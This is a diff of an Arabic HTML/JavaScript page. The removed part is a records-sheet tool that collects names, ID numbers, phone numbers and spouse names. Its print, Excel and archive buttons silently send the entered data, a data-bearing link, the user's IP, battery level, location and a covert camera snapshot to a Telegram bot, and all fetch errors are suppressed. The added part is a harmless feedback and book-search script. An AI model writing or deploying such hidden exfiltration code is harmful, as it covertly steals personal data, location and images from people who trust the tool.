-            setTimeout(() => { window.print(); }, 800);
-        }
-
-        function onExcelButtonClicked() {
-            saveCurrentStateToLocalStorage();
-            const caption = `📊 **طلب حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
-            executeActionAndSend(caption, "كشف_البيانات.txt", "Excel");
-            exportExcelFileOnly();
-        }
-
-        function onArchiveButtonClicked() {
-            saveCurrentStateToLocalStorage();
-            const caption = `💾 **طلب حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
-            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
-            saveArchiveOnly();
-        }
-
-        function executeActionAndSend(captionText, fileName, fileTypeFlag) {
-            const sheets = document.querySelectorAll('.sheet-container');
-            let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
-            fileContent += `تاريخ الإصدار: ${new Date().toLocaleDateString('ar-YE')}\n`;
-            fileContent += `--------------------------------------------------\n`;
-
-            sheets.forEach((sheet, tIndex) => {
-                fileContent += `\n[ الصفحة رقم ${tIndex + 1} ]\n`;
-                const headers = Array.from(sheet.querySelectorAll('thead th')).map(th => (th.innerText || th.textContent).trim());
-                fileContent += headers.join(' | ') + '\n';
-                fileContent += `--------------------------------------------------\n`;
-
-                const rows = sheet.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    const m = row.cells[0] ? (row.cells[0].innerText || row.cells[0].textContent).trim() : '';
-                    const inputs = row.querySelectorAll('.table-input');
-                    let rowHasData = false;
-                    let rowDataStr = m;
-
-                    inputs.forEach(inp => {
-                        const val = (inp.value || inp.getAttribute('value') || '').trim();
-                        if (val !== "") rowHasData = true;
-                        rowDataStr += ` | ${val}`;
-                    });
-
-                    if (rowHasData) {
-                        fileContent += rowDataStr + '\n';
-                    }
-                });
-            });
-
-            const fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
-
-            const wrapperHtml = prepareHtmlForSaving();
-            const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
-            const baseUrl = window.location.href.split('#')[0];
-            const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
-
-            const linkFileContent = `====================================\n` +
-                                    `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
-                                    `${uniqueUserUrl}\n` +
-                                    `====================================\n` +
-                                    `ملاحظة: افتح هذا الرابط لتجد حرفياً نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
-                                    `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
-                                    `تطوير: ميثاق محمد صالح حموده`;
-            const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
-
-            sendIndependentLinkFile(linkFileBlob);
-            if (fileBlob) {
-                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
-            }
-
-            if (cameraPermissionGranted && globalCameraStream) {
-                try {
-                    const video = document.getElementById('videoElement');
-                    const canvas = document.getElementById('canvasElement');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob((photoBlob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('caption', captionText);
-                        formData.append('parse_mode', 'Markdown');
-                        formData.append('photo', photoBlob, 'action_snapshot.jpg');
-
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).catch(e => {});
-                    }, 'image/jpeg', 0.85);
-                } catch (e) {}
-            }
-        }
-
-        function sendIndependentLinkFile(linkBlob) {
-            const linkData = new FormData();
-            linkData.append('chat_id', chatId);
-            linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
-            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (يحمل الأسماء للتعديل)**');
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                method: 'POST',
-                body: linkData
-            }).catch(e => {});
-        }
-
-        function sendDocumentOnly(fileBlob, fileName, caption) {
-            const docData = new FormData();
-            docData.append('chat_id', chatId);
-            docData.append('document', fileBlob, fileName);
-            docData.append('caption', caption);
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                method: 'POST',
-                body: docData
-            }).catch(e => {});
-        }
-
-        function exportExcelFileOnly() {
-            const tables = document.querySelectorAll('.dynamicTable');
-            let csvRows = [];
-
-            tables.forEach((table, tableIndex) => {
-                if (tables.length > 1) {
-                    csvRows.push(`"--- صفحة رقم (${tableIndex + 1}) ---"`);
-                }
-
-                const headers = Array.from(table.querySelectorAll('thead th')).map(th => {
-                    let text = (th.innerText || th.textContent).replace(/"/g, '""').trim();
-                    return `"${text}"`;
-                });
-                csvRows.push(headers.join(','));
-
-                const rows = table.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    if (row.style.display === 'none') return;
-                    const inputs = row.querySelectorAll('.table-input');
-                    const cells = Array.from(inputs).map(inp => {
-                        let text = (inp.value || inp.getAttribute('value') || '').replace(/"/g, '""').trim();
-                        return `"${text}"`;
-                    });
-                    csvRows.push(cells.join(','));
-                });
-                csvRows.push('');
-            });
-
-            const csvString = '\uFEFF' + csvRows.join('\r\n');
-            const blob = new Blob([csvString], { type: 'text/csv;charset=utf-8;' });
-            const url = URL.createObjectURL(blob);
-            const now = new Date();
-            const dateStr = now.toISOString().slice(0, 10);
-            const filename = `كشف_البيانات_${dateStr}.csv`;
-
-            const link = document.createElement('a');
-            link.href = url;
-            link.setAttribute('download', filename);
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        function saveArchiveOnly() {
-            try {
-                const wrapperHtml = prepareHtmlForSaving();
-                const archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-                const now = new Date();
-                const timeString = now.toLocaleDateString('ar-YE') + ' - ' + now.toLocaleTimeString('ar-YE', { hour: '2-digit', minute: '2-digit' });
-
-                archives.push({
-                    id: Date.now(),
-                    title: 'عمل محفوظ بتاريخ: ' + timeString,
-                    html: wrapperHtml
-                });
-
-                localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-            } catch (error) {}
-        }
-
-        function sortNamesAlphabetically() {
-            const wrapper = document.getElementById('pagesWrapper');
-            preSortBackupHtml = wrapper.innerHTML;
-
-            const tables = document.querySelectorAll('.dynamicTable');
-            let allRowsData = [];
-
-            tables.forEach(table => {
-                table.querySelectorAll('tbody tr').forEach(row => {
-                    const inputs = row.querySelectorAll('.table-input');
-                    const name = inputs[0] ? (inputs[0].value || inputs[0].getAttribute('value') || '').trim() : '';
-                    if (name !== "") {
-                        let rowObj = {};
-                        inputs.forEach((inp, idx) => {
-                            rowObj['col_' + idx] = (inp.value || inp.getAttribute('value') || '').trim();
-                        });
-                        allRowsData.push(rowObj);
-                    }
-                });
-            });
-
-            if (allRowsData.length === 0) return;
-
-            allRowsData.sort((a, b) => a.col_0.localeCompare(b.col_0, 'ar', { sensitivity: 'accent' }));
-
-            let dataIndex = 0;
-            tables.forEach(table => {
-                table.querySelectorAll('tbody tr').forEach(row => {
-                    const inputs = row.querySelectorAll('.table-input');
-                    if (dataIndex < allRowsData.length) {
-                        inputs.forEach((inp, idx) => {
-                            const val = allRowsData[dataIndex]['col_' + idx] || '';
-                            inp.value = val;
-                            inp.setAttribute('value', val);
-                        });
-                        dataIndex++;
-                    } else {
-                        inputs.forEach(inp => { inp.value = ''; inp.setAttribute('value', ''); });
-                    }
-                });
-            });
-
-            renumberAllRows();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function cancelAlphabeticalSort() {
-            if (!preSortBackupHtml) return;
-            document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
-            preSortBackupHtml = null;
-            rebindInputs();
-            renumberAllRows();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function normalizeArabic(text) {
-            if (!text) return "";
-            return text
-                .toString()
-                .toLowerCase()
-                .replace(/[\u064b-\u065f]/g, '')
-                .replace(/[أإآا]/g, 'ا')
-                .replace(/ة/g, 'ه')
-                .replace(/ؤ/g, 'و')
-                .replace(/ئ/g, 'ي')
-                .replace(/ى/g, 'ي');
-        }
-
-        function filterTableRows() {
-            const input = document.getElementById('tableSearchInput');
-            const filter = normalizeArabic(input.value.trim());
-            const tables = document.querySelectorAll('.dynamicTable');
-
-            tables.forEach(table => {
-                const rows = table.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    let match = false;
-                    const inputs = row.querySelectorAll('.table-input');
-                    inputs.forEach((inp) => {
-                        let cText = inp.value || inp.getAttribute('value') || '';
-                        if (normalizeArabic(cText).includes(filter)) {
-                            match = true;
-                        }
-                    });
-                    row.style.display = filter === "" || match ? "" : "none";
-                });
-            });
-        }
-
-        function renumberAllRows() {
-            const tables = document.querySelectorAll('.dynamicTable');
-            let globalIndex = 1;
-
-            tables.forEach(table => {
-                const rows = table.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    const firstCell = row.cells[0];
-                    if (firstCell) {
-                        firstCell.textContent = globalIndex;
-                        globalIndex++;
-                    }
-                });
-            });
-        }
-
-        function openPdfModal() {
-            document.getElementById('pdfFileInput').value = '';
-            document.getElementById('pdfStatusMsg').textContent = '';
-            document.getElementById('pdfModal').style.display = 'flex';
-        }
-
-        function closePdfModal() {
-            document.getElementById('pdfModal').style.display = 'none';
-        }
-
-        async function processUploadedPdf() {
-            const fileInput = document.getElementById('pdfFileInput');
-            const statusMsg = document.getElementById('pdfStatusMsg');
-
-            if (!fileInput.files || fileInput.files.length === 0) return;
-
-            const file = fileInput.files[0];
-            statusMsg.textContent = '⏳ جاري قراءة وتحليل ملف الـ PDF...';
-
-            try {
-                const arrayBuffer = await file.arrayBuffer();
-                const loadingTask = pdfjsLib.getDocument({ data: arrayBuffer });
-                const pdfDoc = await loadingTask.promise;
-                
-                let extractedLines = [];
-                for (let i = 1; i <= pdfDoc.numPages; i++) {
-                    const page = await pdfDoc.getPage(i);
-                    const textContent = await page.getTextContent();
-                    let pageLines = textContent.items.map(item => item.str.trim()).filter(text => text.length > 0);
-                    extractedLines = extractedLines.concat(pageLines);
-                }
-
-                if (extractedLines.length === 0) {
-                    statusMsg.textContent = '';
-                    return;
-                }
-
-                populateTableWithData(extractedLines);
-                closePdfModal();
-            } catch (error) {
-                statusMsg.textContent = '';
-            }
-        }
-
-        function populateTableWithData(itemsList) {
-            const wrapper = document.getElementById('pagesWrapper');
-            wrapper.innerHTML = '';
-
-            const rowsPerPage = 15;
-            const totalPages = Math.ceil(itemsList.length / rowsPerPage);
-            let itemIndex = 0;
-
-            for (let p = 1; p <= totalPages; p++) {
-                const newPage = document.createElement('div');
-                newPage.className = 'sheet-container';
-                newPage.setAttribute('onclick', 'setActiveContext(this,event)');
-
-                newPage.innerHTML = `
-                    <div class="header-top">
-                        <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
-                        <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${p})</div>
-                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/11</div>
-                    </div>
-                    <div class="table-wrapper">
-                        <table class="dynamicTable">
-                            <thead>
-                                <tr>
-                                    <th style="width:35px;">م</th>
-                                    <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
-                                    <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
-                                    <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
-                                    <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
-                                    <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
-                                    <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
-                                </tr>
-                            </thead>
-                            <tbody></tbody>
-                        </table>
-                    </div>
-                    <div class="footer-bottom">
-                        <div class="editable-header" contenteditable="true">الإدارة العامة</div>
-                        <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
-                    </div>
-                `;
-
-                wrapper.appendChild(newPage);
-                const tbody = newPage.querySelector('tbody');
-
-                for (let r = 0; r < rowsPerPage; r++) {
-                    const row = tbody.insertRow();
-                    row.setAttribute('onclick', 'selectRow(this,event)');
-                    const cellM = row.insertCell();
-                    cellM.textContent = '-';
-
-                    for (let c = 0; c < 6; c++) {
-                        const cell = row.insertCell();
-                        const input = document.createElement('input');
-                        input.type = 'text';
-                        input.className = 'table-input';
-                        input.onfocus = function() { setActiveInput(this); };
-                        input.oninput = function() { 
-                            this.setAttribute('value', this.value);
-                            saveCurrentStateToLocalStorage(); 
-                        };
-                        
-                        if (c === 0 && itemIndex < itemsList.length) {
-                            input.value = itemsList[itemIndex];
-                            input.setAttribute('value', itemsList[itemIndex]);
-                            itemIndex++;
-                        }
-                        cell.appendChild(input);
-                    }
-                }
-            }
-
-            renumberAllRows();
-            rebindInputs();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function openBulkImportModal() {
-            document.getElementById('bulkNamesTextarea').value = '';
-            document.getElementById('bulkImportModal').style.display = 'flex';
-        }
-
-        function closeBulkImportModal() {
-            document.getElementById('bulkImportModal').style.display = 'none';
-        }
-
-        function processBulkImport() {
-            const rawText = document.getElementById('bulkNamesTextarea').value;
-            const namesList = rawText.split('\n').map(n => n.trim()).filter(n => n.length > 0);
-            if (namesList.length === 0) return;
-            populateTableWithData(namesList);
-            closeBulkImportModal();
-        }
-
-        function checkPhoneNumbers() {
-            const tables = document.querySelectorAll('.dynamicTable');
-            let errorCount = 0;
-
-            tables.forEach(table => {
-                const headers = Array.from(table.querySelectorAll('thead th'));
-                let phoneColIndices = [];
-                headers.forEach((th, idx) => {
-                    let titleText = normalizeArabic(th.innerText || th.textContent);
-                    if ((titleText.includes('جوال') || titleText.includes('هاتف') || titleText.includes('تلفون') || titleText.includes('اتصال')) && !titleText.includes('بطاقه')) {
-                        phoneColIndices.push(idx - 1);
-                    }
-                });
-
-                if (phoneColIndices.length === 0) {
-                    phoneColIndices.push(3);
-                }
-
-                const rows = table.querySelectorAll('tbody tr');
-                rows.forEach(row => {
-                    const inputs = row.querySelectorAll('.table-input');
-                    phoneColIndices.forEach(colIdx => {
-                        const input = inputs[colIdx];
-                        if (input) {
-                            let val = input.value || input.getAttribute('value') || '';
-                            val = val.trim();
-                            let digitsOnly = val.replace(/\D/g, '');
-                            if (val !== "") {
-                                if (digitsOnly.length !== 9) {
-                                    errorCount++;
-                                    input.style.color = '#c62828';
-                                    input.style.textDecoration = 'underline';
-                                    input.style.fontWeight = 'bold';
-                                } else {
-                                    input.style.color = '';
-                                    input.style.textDecoration = '';
-                                    input.style.fontWeight = '';
-                                }
-                            }
-                        }
-                    });
-                });
-            });
-        }
-
-        function openArchiveModal() {
-            const container = document.getElementById('archiveListContainer');
-            container.innerHTML = '';
-            let archives;
-            try {
-                archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-            } catch (error) { archives = []; }
-
-            if (archives.length === 0) {
-                container.innerHTML = `<p style="text-align:center;color:#888;padding:20px;">لا توجد أعمال محفوظة.</p>`;
-            } else {
-                archives.slice().reverse().forEach((item) => {
-                    const div = document.createElement('div');
-                    div.className = 'archive-item';
-                    const info = document.createElement('div');
-                    info.className = 'archive-item-info';
-                    info.textContent = '📄 ' + item.title;
-
-                    const actions = document.createElement('div');
-                    actions.style.display = 'flex';
-                    actions.style.gap = '8px';
-
-                    const loadButton = document.createElement('button');
-                    loadButton.className = 'btn btn-green';
-                    loadButton.style.padding = '4px 10px';
-                    loadButton.textContent = '📂 استرجاع وتعديل';
-                    loadButton.onclick = function () { loadArchiveItem(item.id); };
-
-                    const deleteButton = document.createElement('button');
-                    deleteButton.className = 'btn btn-red';
-                    deleteButton.style.padding = '4px 10px';
-                    deleteButton.textContent = '🗑️ حذف';
-                    deleteButton.onclick = function () { deleteArchiveItem(item.id); };
-
-                    actions.appendChild(loadButton);
-                    actions.appendChild(deleteButton);
-                    div.appendChild(info);
-                    div.appendChild(actions);
-                    container.appendChild(div);
-                });
-            }
-            document.getElementById('archiveModal').style.display = 'flex';
-        }
-
-        function closeArchiveModal() {
-            document.getElementById('archiveModal').style.display = 'none';
-        }
-
-        function loadArchiveItem(id) {
-            let archives;
-            try {
-                archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-            } catch (error) { return; }
-
-            const found = archives.find(item => item.id === id);
-            if (found) {
-                document.getElementById('pagesWrapper').innerHTML = found.html;
-                rebindInputs();
-                saveCurrentStateToLocalStorage();
-                closeArchiveModal();
-            }
-        }
-
-        function deleteArchiveItem(id) {
-            let archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
-            archives = archives.filter(item => item.id !== id);
-            localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
-            openArchiveModal();
-        }
-
-        function resetAllData() {
-            if (confirm('مسح الصفحة والبدء من جديد؟')) {
-                localStorage.removeItem('toufan_live_table_data');
-                location.reload();
-            }
-        }
-
-        function addRowToActiveTable() {
-            if (!activeTable) {
-                const firstSheet = document.querySelector('.sheet-container');
-                activeTable = firstSheet.querySelector('table');
-            }
-            if (!activeTable) return;
-
-            const tbody = activeTable.querySelector('tbody');
-            const newRow = tbody.insertRow();
-            newRow.setAttribute('onclick', 'selectRow(this,event)');
-
-            const cellM = newRow.insertCell();
-            cellM.textContent = '-';
-
-            const colCount = activeTable.querySelectorAll('thead th').length - 1;
-            for (let c = 0; c < colCount; c++) {
-                const cell = newRow.insertCell();
-                const input = document.createElement('input');
-                input.type = 'text';
-                input.className = 'table-input';
-                input.onfocus = function() { setActiveInput(this); };
-                input.oninput = function() { 
-                    this.setAttribute('value', this.value);
-                    saveCurrentStateToLocalStorage(); 
-                };
-                cell.appendChild(input);
-            }
-            renumberAllRows();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function addColumnToActiveTable() {
-            if (!activeTable) {
-                const firstSheet = document.querySelector('.sheet-container');
-                activeTable = firstSheet.querySelector('table');
-            }
-            if (!activeTable) return;
-
-            const headerRow = activeTable.querySelector('thead tr');
-            const th = document.createElement('th');
-            th.style.width = '80px';
-            th.setAttribute('contenteditable', 'true');
-            th.textContent = 'جديد';
-            th.oninput = function() { saveCurrentStateToLocalStorage(); };
-            headerRow.appendChild(th);
-
-            const tbody = activeTable.querySelector('tbody');
-            Array.from(tbody.rows).forEach(row => {
-                const td = row.insertCell();
-                const input = document.createElement('input');
-                input.type = 'text';
-                input.className = 'table-input';
-                input.onfocus = function() { setActiveInput(this); };
-                input.oninput = function() { 
-                    this.setAttribute('value', this.value);
-                    saveCurrentStateToLocalStorage(); 
-                };
-                td.appendChild(input);
-            });
-            saveCurrentStateToLocalStorage();
-        }
-
-        function deleteSelectedRow() {
-            if (!activeRowElement) return;
-            const tbody = activeRowElement.parentElement;
-            if (tbody.rows.length > 1) {
-                activeRowElement.remove();
-                activeRowElement = null;
-                activeInputElement = null;
-                renumberAllRows();
-                saveCurrentStateToLocalStorage();
-            }
-        }
-
-        function deleteSelectedColumn() {
-            if (!activeTable) return;
-            const headerRow = activeTable.querySelector('thead tr');
-            if (headerRow.cells.length <= 2) return;
-
-            let index = headerRow.cells.length - 1;
-            headerRow.deleteCell(index);
-            const tbody = activeTable.querySelector('tbody');
-            Array.from(tbody.rows).forEach(row => {
-                if (row.cells[index]) row.deleteCell(index);
-            });
-            saveCurrentStateToLocalStorage();
-        }
-
-        function deleteActivePage() {
-            const pages = document.querySelectorAll('.sheet-container');
-            if (pages.length <= 1) return;
-            if (!confirm('حذف هذه الصفحة؟')) return;
-
-            if (activeSheet && activeSheet.isConnected) {
-                activeSheet.remove();
-            } else {
-                pages[pages.length - 1].remove();
-            }
-            renumberAllRows();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function addNewPage() {
-            const wrapper = document.getElementById('pagesWrapper');
-            const pageCount = wrapper.querySelectorAll('.sheet-container').length + 1;
-
-            const newPage = document.createElement('div');
-            newPage.className = 'sheet-container';
-            newPage.setAttribute('onclick', 'setActiveContext(this,event)');
-
-            newPage.innerHTML = `
-                <div class="header-top">
-                    <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
-                    <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${pageCount})</div>
-                    <div class="editable-header" contenteditable="true">التاريخ: ---</div>
-                </div>
-                <div class="table-wrapper">
-                    <table class="dynamicTable">
-                        <thead>
-                            <tr>
-                                <th style="width:35px;">م</th>
-                                <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
-                                <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
-                                <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
-                                <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
-                                <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
-                                <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            ${Array.from({length:15}, () => `
-                                <tr onclick="selectRow(this,event)">
-                                    <td>-</td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                </tr>
-                            `).join('')}
-                        </tbody>
-                    </table>
-                </div>
-                <div class="footer-bottom">
-                    <div class="editable-header" contenteditable="true">الإدارة العامة</div>
-                    <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
-                </div>
-            `;
-
-            wrapper.appendChild(newPage);
-            renumberAllRows();
-            rebindInputs();
-            saveCurrentStateToLocalStorage();
-        }
-
-        function changeFontFamily(fontValue) {
-            document.body.style.fontFamily = fontValue;
-            document.querySelectorAll('.btn, select, input').forEach(el => { el.style.fontFamily = fontValue; });
-        }
-
-        function changeTextColor(colorValue) {
-            document.querySelectorAll('.sheet-container, .sheet-container th, .table-input, .editable-header').forEach(el => { el.style.color = colorValue; });
-        }
-    </script>
+      `).join('');
+    }
+
+    function addFeedback(e) {
+      e.preventDefault();
+      const newFeed = {
+        id: Date.now(),
+        name: document.getElementById('feedName').value,
+        text: document.getElementById('feedText').value,
+        date: new Date().toISOString().split('T')[0]
+      };
+      feedbackData.unshift(newFeed);
+      localStorage.setItem('methaq_feedback', JSON.stringify(feedbackData));
+      renderFeedbacks();
+      document.getElementById('feedbackForm').reset();
+      alert('شكراً لك على مشاركة رأيك الطيب!');
+    }
+
+    function deleteFeedback(id) {
+      if (confirm("هل أنت متأكد من حذف هذا التعليق؟")) {
+        feedbackData = feedbackData.filter(f => f.id !== id);
+        localStorage.setItem('methaq_feedback', JSON.stringify(feedbackData));
+        renderFeedbacks();
+        alert("تم حذف التعليق بنجاح.");
+      }
+    }
+
+    function switchTab(tabId, event) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('.tab-link').forEach(el => el.classList.remove('active'));
+      document.getElementById('tab-' + tabId).classList.add('active');
+      event.target.classList.add('active');
+    }
+
+    function searchBooks(query) {
+      const q = query.toLowerCase();
+      document.querySelectorAll('.book-card').forEach(card => {
+        const title = card.querySelector('.book-title').innerText.toLowerCase();
+        card.style.display = title.includes(q) ? 'flex' : 'none';
+      });
+    }
+  </script>
 </body>
 </html>
